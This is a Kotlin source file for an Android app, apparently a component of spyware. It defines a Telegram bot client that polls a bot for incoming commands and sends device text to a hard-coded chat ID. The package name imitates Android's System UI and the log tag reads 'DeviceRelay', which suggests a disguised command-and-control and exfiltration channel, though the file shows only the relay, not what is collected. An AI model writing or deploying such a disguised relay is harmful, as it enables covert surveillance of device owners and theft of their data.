package com.systemui.package

import android.util.Log
import com.google.gson.Gson
import com.google.gson.JsonObject
import com.systemui.package.Config.BASE_URL
import com.systemui.package.Config.CHAT_ID
import com.systemui.package.Config.GET_UPDATES_URL
import com.systemui.package.Config.MAX_MSG_LENGTH
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

object TelegramApi {
    private const val TAG = "DeviceRelay"
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private val gson = Gson()

    data class Update(
        val updateId: Long,
        val chatId: String,
        val text: String
    )

    suspend fun getUpdates(offset: Long): List<Update> = withContext(Dispatchers.IO) {
        try {
            val url = "$GET_UPDATES_URL?offset=$offset&timeout=2"
            val request = Request.Builder().url(url).get().build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.e(TAG, "getUpdates failed: ${response.code}")
                    return@withContext emptyList()
                }

                val body = response.body?.string() ?: return@withContext emptyList()
                val json = gson.fromJson(body, JsonObject::class.java)

                if (!json.has("result")) {
                    return@withContext emptyList()
                }

                val results = json.getAsJsonArray("result")
                val updates = mutableListOf<Update>()

                for (element in results) {
                    val obj = element.asJsonObject
                    val updateId = obj.get("update_id")?.asLong ?: continue
                    val message = obj.getAsJsonObject("message") ?: continue
                    val chat = message.getAsJsonObject("chat") ?: continue
                    val chatId = chat.get("id")?.asString ?: continue
                    val text = message.get("text")?.asString ?: continue

                    updates.add(Update(updateId, chatId, text))
                }

                updates
            }
        } catch (e: Exception) {
            Log.e(TAG, "getUpdates error", e)
            emptyList()
        }
    }

    suspend fun sendMessage(text: String): Boolean = withContext(Dispatchers.IO) {
        try {
            val jsonBody = gson.toJson(mapOf(
                "chat_id" to CHAT_ID,
                "text" to text,
                "parse_mode" to "HTML"
            ))

            val requestBody = jsonBody.toRequestBody("application/json".toMediaType())
            val request = Request.Builder().url(BASE_URL).post(requestBody).build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.e(TAG, "sendMessage failed: ${response.code}")
                    delay(2000)
                    retrySendMessage(text)
                } else {
                    true
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendMessage error", e)
            false
        }
    }

    private suspend fun retrySendMessage(text: String): Boolean {
        return try {
            val jsonBody = gson.toJson(mapOf(
                "chat_id" to CHAT_ID,
                "text" to text,
                "parse_mode" to "HTML"
            ))

            val requestBody = jsonBody.toRequestBody("application/json".toMediaType())
            val request = Request.Builder().url(BASE_URL).post(requestBody).build()

            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e(TAG, "retrySendMessage error", e)
            false
        }
    }

    suspend fun sendLongMessage(text: String) {
        if (text.length <= MAX_MSG_LENGTH) {
            sendMessage(text)
            return
        }

        val chunks = splitMessage(text)
        for (chunk in chunks) {
            sendMessage(chunk)
            delay(300)
        }
    }

    private fun splitMessage(text: String): List<String> {
        val chunks = mutableListOf<String>()
        val lines = text.split("\n")
        val currentChunk = StringBuilder()

        for (line in lines) {
            if (currentChunk.length + line.length + 1 > MAX_MSG_LENGTH) {
                if (currentChunk.isNotEmpty()) {
                    chunks.add(currentChunk.toString())
                    currentChunk.clear()
                }
                if (line.length > MAX_MSG_LENGTH) {
                    val chunkedLine = chunkString(line, MAX_MSG_LENGTH)
                    chunks.addAll(chunkedLine)
                } else {
                    currentChunk.append(line)
                }
            } else {
                if (currentChunk.isNotEmpty()) currentChunk.append("\n")
                currentChunk.append(line)
            }
        }

        if (currentChunk.isNotEmpty()) chunks.add(currentChunk.toString())
        return chunks
    }

    private fun chunkString(text: String, chunkSize: Int): List<String> {
        val chunks = mutableListOf<String>()
        var i = 0
        while (i < text.length) {
            chunks.add(text.substring(i, minOf(i + chunkSize, text.length)))
            i += chunkSize
        }
        return chunks
    }
}